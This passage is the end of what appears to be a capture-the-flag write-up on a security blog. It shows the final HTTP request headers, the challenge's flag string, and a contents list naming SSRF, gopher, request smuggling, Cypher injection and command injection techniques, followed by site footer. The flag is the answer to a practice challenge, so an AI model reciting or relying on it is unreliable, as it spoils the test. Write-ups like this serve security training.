Content-Length: 40
Expect: 100-continue

HTB{br34k_f1r3wal1s_4nd_bypas5_m34sur35}
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a></li><li><a href="#ssrf-exploitation">SSRF Exploitation</a><ul><li><a href="#mongodb-wire-protocol">MongoDB Wire Protocol</a></li><li><a href="#gopher-protocol">Gopher protocol</a></li><li><a href="#failed-attempts">Failed attempts</a></li><li><a href="#http-request-smuggling">HTTP request smuggling</a></li></ul></li><li><a href="#getting-rce">Getting RCE</a><ul><li><a href="#cypher-injection-neo4j">Cypher injection (neo4j)</a></li><li><a href="#command-injection">Command injection</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>